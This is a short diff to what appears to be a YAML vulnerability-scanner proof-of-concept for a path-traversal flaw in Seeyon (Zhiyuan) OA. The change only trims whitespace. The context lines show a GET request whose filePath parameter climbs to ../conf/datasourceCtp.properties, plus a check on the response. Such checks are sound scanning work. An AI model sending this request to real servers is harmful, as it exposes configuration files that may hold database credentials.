@@ -2,7 +2,7 @@ name: poc-yaml-zhiyuan-oa-path-traversal
 rules:
   - method: GET
     path: /seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties
-    expression: 
+    expression:
       response.status == 200 && response.body.bcontains(b"workflow")
 detail:
   author: sakura404x
